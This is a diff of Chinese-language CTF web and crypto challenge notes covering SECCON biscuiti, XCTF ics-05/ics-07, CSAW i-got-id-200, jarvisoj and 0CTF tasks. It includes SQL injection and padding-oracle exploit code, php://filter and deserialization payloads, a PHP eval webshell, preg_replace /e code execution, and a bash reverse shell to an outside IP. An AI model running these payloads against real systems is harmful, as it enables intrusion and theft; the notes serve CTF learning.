@@ -739,6 +739,7 @@
 	?>
 	此时改一下 cookies，margin=margin，游戏结束
 
+	php://filter/read=convert.base64-encode/resource=/luodi/youzanyangnk/wangyi.php
 	
 # flag在index里
 	http://123.206.87.240:8005/post/index.php?file=show.php
@@ -1579,10 +1580,26 @@
 
 
 # biscuiti-300
+    Docker
+    docker pull sysucsa/ctfs_docker:seccon2016_web_biscuiti
+    docker run -d -p 8000:80 sysucsa/ctfs_docker:seccon2016_web_biscuiti
+	
+	脚本写的非常好，还配了上面的 docker
+	http://ssst0n3.github.io/2017/01/16/2017-01-16-biscuiti/#more
+
 	https://blog.csdn.net/qq_19876131/article/details/53674972
+
+	外国大佬
+	https://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/
 	考察知识点：sql注入，php 弱类型比较（两者为空则相等），cbc padding oracle attack
 
-
+    直接就拿到了 index.php 的备份文件
+    注入可得
+    +----------+--------------------------+
+    | username | enc_password             |
+    +----------+--------------------------+
+    | admin    | wCqHs1eDcCePiImvDZzwXw== |
+    +----------+--------------------------+
 
 	<?php
 	error_reporting(0);
@@ -1603,9 +1620,9 @@
 	/*
 	Setup:
 	CREATE TABLE user (
-	username VARCHAR(255),
-	enc_password VARCHAR(255),
-	isadmin BOOLEAN
+        username VARCHAR(255),
+        enc_password VARCHAR(255),
+        isadmin BOOLEAN
 	);
 	INSERT INTO user VALUES ("admin", "***censored***", 1);
 	*/
@@ -1615,29 +1632,33 @@
 		$iv = substr($enc_password, 0, 16);
 		$c = substr($enc_password, 16);
 		$password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
-		return $password == $input;
+        return $password == $input;
+        // 这里只是弱类型比较，由手册可知，openssl_decrypt 在解密错误时会返回 false，所以我们传一个 passwd=0 即可，密文随意
 	}
 	
 	function mac($input) {
 		$iv = str_repeat("\0", 16);
 		$c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
-		return substr($c, -16);
+		return substr($c, -16);  // 只返回了后十六位
 	}
 	
 	function save_session() {
 		global $SESSION;
-		$j = serialize($SESSION);
+        $j = serialize($SESSION);
+        // a:2:{s:4:"name";s:4:"aaaa";s:7:"isadmin";N;} + xxx
+        // 将 session 序列化后的字符串拼接了其密文写入 cookie
 		$u = $j . mac($j);
 		setcookie("JSESSION", base64_encode($u));
 	}
-	
+    
+    // 总的作用就是验证 session 是否被篡改，与 md5 类似
 	function load_session() {
 		global $SESSION;
 		if (!isset($_COOKIE["JSESSION"]))
 			return array();
 		$u = base64_decode($_COOKIE["JSESSION"]);
-		$j = substr($u, 0, -16);
-		$t = substr($u, -16);
+		$j = substr($u, 0, -16);  // session
+		$t = substr($u, -16);  // 后 16 位为以前添加的 mac
 		if (mac($j) !== $t)
 			return array(2);
 		$SESSION = unserialize($j);
@@ -1647,56 +1668,25 @@
 		return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
 	}
 	
-	function login_page($message = NULL) {
-	?><!doctype html>
-	<html>
-	<head><title>Login</title></head>
-	<body>
-	<?php
-		if (isset($message)) {
-			echo "  <div>" . _h($message) . "</div>\n";
-		}
-	?>
-	  <form method="POST">
-		<div>
-		  <label>username</label>
-		  <input type="text" name="username">
-		</div>
-		<div>
-		  <label>password</label>
-		  <input type="password" name="password">
-		</div>
-		<input type="submit" value="login">
-	  </form>
-	</body>
-	</html>
-	<?php
-		  exit;
-	}
+    function login_page($message = null) {
+        if (isset($message)) {
+            echo "  <div>" . _h($message) . "</div>\n";
+        }
+    }
 	
 	function info_page() {
 		global $SESSION;
-	?><!doctype html>
-	<html>
-	<head><title>Login</title></head>
-	<body>
-	<?php
 		printf("Hello %s\n", _h($SESSION["name"]));
-		if ($SESSION["isadmin"])
+		if ($SESSION["isadmin"])  // 一定要有此项才 include flag
 			include("../flag");
-	?>
-	<div><a href="logout.php">Log out</a></div>
-	</body>
-	</html>
-	<?php
-		  exit;
 	}
 	
 	if (isset($_POST['username']) && isset($_POST['password'])) {
 		$username = (string)$_POST['username'];
 		$password = (string)$_POST['password'];
 		$dbh = new PDO('sqlite:users.db');
-		$result = $dbh->query("SELECT username, enc_password from user WHERE username='{$username}'");
+        $result = $dbh->query("SELECT username, enc_password from user WHERE username='{$username}'");
+        // 没有任何过滤，直接注入
 		if (!$result) {
 			login_page("error");
 			$info = $dbh->errorInfo();
@@ -1705,7 +1695,8 @@
 		$u = $result->fetch(PDO::FETCH_ASSOC);
 		if ($u && auth($u["enc_password"], $password)) {
 			$SESSION["name"] = $u['username'];
-			$SESSION["isadmin"] = $u['isadmin'];
+            $SESSION["isadmin"] = $u['isadmin'];
+            // 然而数据库里压根就没有 isadmin，所以这直接为 0
 			save_session();
 			info_page();
 		}
@@ -1727,9 +1718,7 @@
 
 	from Crypto.Util.number import *
 	from Crypto.Cipher import AES
-	import requests
-	import time
-	import base64
+	import requests, time, base64
 
 
 	def xor(a, b):
@@ -1750,7 +1739,7 @@
 				assert len(iv + c) == 48
 				uname = "' UNION SELECT 'a', '%s" % (base64.b64encode(iv + c))
 				url = "http://biscuiti.pwn.seccon.jp/"
-				payload = payload = {"username":uname, "password":""}
+				payload = {"username":uname, "password":""}
 				r = requests.post(url, data=payload)
 
 				if r.text.find("Hello") < 0:
@@ -1765,7 +1754,7 @@
 
 	uname = "' UNION SELECT 'aaaaaaaaaaaaaaaaaaaaaaaaaa', 'hoge"
 	url = "http://biscuiti.pwn.seccon.jp/"
-	payload = payload = {"username":uname, "password":""}
+	payload = {"username":uname, "password":""}
 	r = requests.post(url, data=payload)
 
 	jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")
@@ -2038,6 +2027,7 @@
 	touch /var/www/html/includes/uploaded/index.php
 	chmod 000 /var/www/html/includes/uploaded/index.php
 
+	*/
 	总结，这题其实满满的坑点，没太多意思，但我莫名其妙的坚持下来了，各种尝试，然而环境不给力，依然无法找到 flag
 	这里学到一个新思路，利用软连接，即 Linux 上的快捷方式，实现目录穿越，骚的一b
 	按理说，autoload() 里的这个 include "./includes/$page"; 是可以作为文件包含，结合之前的 unzip.sh 内容，只是删除了带 . 的文件
@@ -2058,6 +2048,113 @@
 	然后利用 passthru('cat ' . 'uploaded/' . $_GET['step']);
 	?step=12345678901234567890 就可以实现文件读取了
 	话说回来，此题还是有点为了出题而出题的感觉，很多过滤并没实际意义
+
+
+# XCTF 4th-CyberEarth ics-07
+	工控云管理系统项目管理页面解析漏洞 phps 应该可以
+	<?php
+	session_start();
+
+	if (!isset($_GET[page])) {
+		show_source(__FILE__);
+		die();
+	}
+
+	if (isset($_GET[page]) && $_GET[page] != 'index.php') {
+		include('flag.php');
+	}else {
+		header('Location: ?page=flag.php');
+	}
+
+
+	// 要有 admin 权限才能写
+	if ($_SESSION['admin']) {
+		$con = $_POST['con'];
+		$file = $_POST['file'];
+		$filename = "backup/".$file;
+
+		if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
+			die("Bad file extension");
+		} else {
+			chdir('uploaded');
+			$f = fopen($filename, 'w');
+			// 写 shell phps 无法解析
+			// con=<?php @eval($_POST[1]);?\>&file=../1.php/.
+			// xctf{b7aedc3107440ed1910514cbaffd9037}
+			fwrite($f, $con);
+			fclose($f);
+		}
+	}
+
+	if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
+		include 'config.php';
+		// 宽字节注入 2%EF%BF%BD%23or1--+9 居然不行？ 理解有误，有待加强
+		// 然而 id=1 9 就可以了，本意可能不是注入
+		$id = mysql_real_escape_string($_GET[id]);
+		$sql="select * from cetc007.user where id='$id'";
+		$result = mysql_query($sql);
+		$result = mysql_fetch_object($result);
+		} else {
+			$result = False;
+			die();
+		}
+
+		if(!$result) die("<br >something wae wrong ! <br>");
+		if($result) {
+			echo "id: ".$result->id."</br>";
+			echo "name:".$result->user."</br>";
+			$_SESSION['admin'] = True;
+		}
+		?>
+
+# XCTF 4th-CyberEarth ics-05
+	其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统
+	/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
+	得到源码：
+	<?php
+	if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+		echo "<br >Welcome My Admin ! <br >";
+
+		$pattern = $_GET[pat];
+		$replacement = $_GET[rep];
+		$subject = $_GET[sub];
+
+		if (isset($pattern) && isset($replacement) && isset($subject)) {
+			preg_replace($pattern, $replacement, $subject);
+		}else{
+			die();
+		}
+	}
+	?>
+	X-FORWARDED-FOR = 127.0.0.1
+	一句话 @preg_replace("/abcde/e", $_POST['a'], "abcdefg");
+	preg_replace() /e 可以 RCE 参考 https://www.cnblogs.com/dhsx/p/4991983.html
+	有版本限制：This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
+	成功执行：pat=/test/e&rep=phpinfo()&sub=jutst%20test
+	show_source('/var/www/html/s3chahahaDir/flag/flag.php')
+	若显示服务器无法处理，进行url编码，以避免误解
+
+
+# csaw-ctf-2016-quals i-got-id-200
+	> 嗯。。我刚建好了一个网站
+	有三个界面，Hello World / Forms / Files
+	Forms 页面会把你的输入显示的页面上，有 self xss，没啥用
+	Files 页面有上传的功能，并没有显示上传的目录，并且将上传的内容直接输出到屏幕上
+	用的是 perl CGI，尝试寻找 RCE，我还没用过 perl，找文档开始学习，打 CTF 就是不断学习新知识的过程
+	简单扫了一圈，没发现有源码泄露，CGi 之前爆过 Shellshocke 漏洞，没找到合适的资料
+	随即开始猜测后端的写法，咱们找一找文件操作相关的函数，
+	参考 https://www.cgisecurity.com/lib/sips.html https://qntm.org/files/perl/perl_cn.html
+	重点看这个 https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a	漏洞成因及payload
+	原作者是如何找到这篇文章的？经验？ wp https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/web-200-i_got_id.md
+	还是没完全搞懂
+	bash%20-i%20>%26%20%2fdev%2ftcp%2f47.101.220.241%2f8008%2f0>%261%20| 弹shell失败。。
+	题目环境 https://github.com/ctfs/write-ups-2016/tree/master/csaw-ctf-2016-quals/web/i-got-id-200
+
+
+# CISCN-2018-Final 4jia1
+	swjWJVRtazwtcARioEhUOpyzgKOrICunmNRlngieqrFuGNgOVGPKoaxIDcmFQaYtnITdSKufADqWFkpJmqpWTxUBQEOfJJsjefZf
+	
 
 # bugku insert into 注入题（XFF注入）
 	关键代码
@@ -2452,51 +2549,51 @@
 	<data>&file;</data>
 
 # jarvisoj 神盾局的秘密
-	/showimg.php?img=c2hvd2ltZy5waHA= 读取 showing.php 源码
-	<?php
-		$f = $_GET['img'];
-		if (!empty($f)) {
-			$f = base64_decode($f);
-			if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE 
-			&& stripos($f,'\\')===FALSE	&& stripos($f,'pctf')===FALSE) {
-				readfile($f);
-			} else {
-				echo "File not found!";
+/showimg.php?img=c2hvd2ltZy5waHA= 读取 showing.php 源码
+<?php
+	$f = $_GET['img'];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE 
+		&& stripos($f,'\\')===FALSE	&& stripos($f,'pctf')===FALSE) {
+			readfile($f);
+		} else {
+			echo "File not found!";
+		}
+	}
+?>
+
+同理可得 index.php
+<?php 
+	require_once('shield.php');
+	$x = new Shield();
+	isset($_GET['class']) && $g = $_GET['class'];
+	if (!empty($g)) {
+		$x = unserialize($g);
+	}
+	echo $x->readfile();
+?>
+
+shield.php
+<?php
+	//flag is in pctf.php
+	class Shield {
+		public $file;
+		function __construct($filename = '') {
+			$this -> file = $filename;
+		}
+		
+		function readfile() {
+			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+				return @file_get_contents($this->file);
 			}
 		}
-	?>
+	}
+?>
 
-	同理可得 index.php
-	<?php 
-		require_once('shield.php');
-		$x = new Shield();
-		isset($_GET['class']) && $g = $_GET['class'];
-		if (!empty($g)) {
-			$x = unserialize($g);
-		}
-		echo $x->readfile();
-	?>
-
-	shield.php
-	<?php
-		//flag is in pctf.php
-		class Shield {
-			public $file;
-			function __construct($filename = '') {
-				$this -> file = $filename;
-			}
-			
-			function readfile() {
-				if (!empty($this->file) && stripos($this->file,'..')===FALSE  
-				&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
-					return @file_get_contents($this->file);
-				}
-			}
-		}
-	?>
-
-	payload:
-	/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
+payload:
+/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
 
 
 # jarvisoj port51
@@ -2519,15 +2616,15 @@
 	</html>
 	
 # jarvisoj login
-	header 头里面发现 hint: "select * from `admin` where password='".md5($pass,true)."'"
-	md5 ( string $str [, bool $raw_output = FALSE ] ) : string
-	string 要计算的字符串 
-	raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数
-	参考 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html
-		http://www.am0s.com/functions/204.html
-	有个牛逼的字符串： ffifdyop
-	传入之后，最终的 sql 语句变为 select * from `admin` where password=''or'6�]��!r,��b'
-	成功闭合，得到万能密码
+header 头里面发现 hint: "select * from `admin` where password='".md5($pass,true)."'"
+md5 ( string $str [, bool $raw_output = FALSE ] ) : string
+string 要计算的字符串 
+raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数
+参考 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html
+	http://www.am0s.com/functions/204.html
+有个牛逼的字符串： ffifdyop
+传入之后，最终的 sql 语句变为 select * from `admin` where password=''or'6�]��!r,��b'
+成功闭合，得到万能密码
 
 
 # jarvisoj RE
@@ -2893,8 +2990,8 @@
 
 
 # hackme command-exeutor
-	只能执行两个命令 ls / env
-
+	只能执行两个命令 ls / env，猜测试任意命令执行
+	这里有文件包含，拖到所有源码
 	index.php?func=php://filter/read=convert.base64-encode/resource=index
 
 	# index
@@ -2940,6 +3037,7 @@
 		system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
 	}
 
+	// 这里有个特别的东西
 	foreach($_SERVER as $key => $val) {
 		if(substr($key, 0, 5) === 'HTTP_') {
 			putenv("$key=$val");  // 设置系统变量
@@ -2965,9 +3063,9 @@
 
 	function render_default() { ?>
 	<?php foreach($pages as list($file, $title)): ?>
-			<li class="nav-item">
-			<a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
-			</li>
+		<li class="nav-item">
+		<a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
+		</li>
 	<?php endforeach; ?>
 
 		<div class="container"><?php if(is_callable('render')) render(); else render_default(); ?></div>
@@ -3092,6 +3190,8 @@
 	}
 	?>
 
+	putenv ( string $setting ) : bool
+	添加 setting 到服务器环境变量，环境变量仅存活于当前请求期间，在请求结束时环境会恢复到初始状态。
 
 
 
@@ -3177,3 +3277,97 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 	}
 	//$hint =  "php function getFlag() to get flag";
 	?>
+
+# 2019 TCTF lfsr
+	https://fireshellsecurity.team/0ctf-zer0lfsr/
+	https://hxp.io/blog/49/0CTF-Quals-2019-zer0lfsr-writeup/
+
+	from secret import init1,init2,init3,FLAG
+	import hashlib
+	assert(FLAG=="flag{"+hashlib.sha256(init1+init2+init3).hexdigest()+"}")
+
+	class lfsr():
+		def __init__(self, init, mask, length):
+			self.init = init
+			self.mask = mask
+			self.lengthmask = 2**(length+1)-1  # 48 个 1
+
+		def next(self):
+			# 超过 48 位了，每次扔掉最高位
+			nextdata = (self.init << 1) #& self.lengthmask  # 48 个 1
+			i = self.init & self.mask #& self.lengthmask 
+			output = 0
+			while i != 0:
+				output ^= (i & 1)  # 最低位
+				i = i >> 1
+			# 奇数个 1，output 就是 1，否则是 0
+			# 1/3 => 1  2/3 => 0
+			nextdata ^= output
+			# init & mask 奇数个 1 nextdata 最低位变 0，偶数就不变
+			self.init = nextdata
+			return output
+
+	def combine(x1,x2,x3):
+		return (x1*x2)^(x2*x3)^(x1*x3)
+		# (x1 & x2) ^ (x2 & x3) ^ (x1 & x3)
+		"""
+		概率都是 75%
+		(0, 0, 0,   0)
+		(0, 0, 1,   0)
+		(0, 1, 0,   0)
+		(0, 1, 1,   1)
+		(1, 0, 0,   0)
+		(1, 0, 1,   1)
+		(1, 1, 0,   1)
+		(1, 1, 1,   1)
+		"""
+
+	init1 = 0b11101010111100111001001000111101010101100101100000001
+	init2 = 0b11011000111000100011011011011010000000110101111000100
+	init3 = 0b11101101011000011100101111100000100000011111011011001
+
+	if __name__=="__main__":
+		# bytes类型的变量，转化为十进制整数
+		l1 = lfsr(int.from_bytes(init1,"big"),0b100000000000000000000000010000000000000000000000,48)
+		l2 = lfsr(int.from_bytes(init2,"big"),0b100000000000000000000000000000000010000000000000,48)
+		l3 = lfsr(int.from_bytes(init3,"big"),0b100000100000000000000000000000000000000000000000,48)
+
+		with open("keystream","wb") as f:
+			for i in range(8192):
+				b = 0
+				for j in range(8):
+					b = (b<<1)+combine(l1.next(),l2.next(),l3.next())
+				# 逆过来就是 bin(ord(b.decode()))，其中每一个序列都是 combine
+				f.write(chr(b).encode())
+	还给了一个 keystream，因为 encode()，所以不是最初的结果，需要在处理一下
+
+	barr = b''
+	with open('keystream','rb') as f:
+		data = f.read()
+		i = 0
+		while i < len(data):
+			if data[i] == 194 or data[i] == 195:
+				barr += bytes([ord(bytes([data[i], data[i+1]]).decode())])
+				i += 1
+			else:
+				barr += bytes([ord(bytes([data[i]]).decode())])
+			i += 1
+	with open('decoded-keystream', 'wb') as f:
+		f.write(barr)
+
+	
+	
+# 2019 TCTF ghostpepper
+	jolokia karaf 
+	Java web api 泄露
+	https://blog.csdn.net/cyl_cheng_1996/article/details/75715548
+	https://www.jianshu.com/p/bfc5a8e73ca9
+	https://momomoxiaoxi.com/2019/03/26/tctf2019/
+	https://www.anquanke.com/post/id/103016
+	https://jolokia.org/reference/html/protocol.html#list
+	https://karaf.apache.org/manual/latest/#_quick_start
+
+# 2019 TCTF WallbreakerEasy
+	直接给了一个 eval 后门，目标是命令执行 ./readflag
+
+# 
